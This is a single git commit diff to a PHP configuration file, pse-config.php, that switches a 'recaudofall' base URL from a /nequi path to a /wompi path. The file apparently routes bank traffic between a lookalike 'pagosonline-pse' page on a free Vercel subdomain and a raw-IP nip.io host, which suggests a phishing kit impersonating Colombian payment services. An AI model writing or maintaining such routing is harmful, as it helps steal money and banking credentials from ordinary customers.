eae5a6f1a5a2c746bc1de16f646ee068729e800d
maxbruno1 <short.fork1771@fastmail.com>
2026-09-23 00:08:54 -0500

    Update recaudo fall base URL in configuration

--- pse-config.php
+++ pse-config.php
@@ -18,7 +18,7 @@ return [
 
     'links' => [
         'primary_page' => 'https://pagosonline-pse.vercel.app',
-        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/nequi',
+        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/wompi',
     ],
 
     // Bancos que van a la pasarela Vercel.
